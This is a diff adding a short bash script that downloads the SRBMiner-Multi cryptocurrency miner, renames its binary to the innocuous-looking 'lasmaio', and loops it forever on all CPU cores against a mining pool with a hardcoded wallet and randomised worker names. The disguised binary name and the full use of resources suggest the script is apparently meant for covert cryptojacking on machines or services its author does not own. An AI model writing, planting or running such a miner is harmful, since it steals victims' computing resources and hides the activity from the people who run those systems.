@@ -1,0 +1,8 @@
+#!/bin/bash
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.9.0/SRBMiner-Multi-3-9-0-Linux.tar.gz
+tar xf SRBMiner-Multi-3-9-0-Linux.tar.gz
+cd SRBMiner-Multi-3-9-0
+mv SRBMiner-MULTI lasmaio
+while true; do
+./lasmaio --disable-gpu --algorithm xelishashv3 --pool xel.kryptex.network:7019 --wallet xel:ns93l5nhjnwgkd6l3xrwf332prju6mupp94wle936acw5fsv4fnsqn7sfjy/$(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
+done
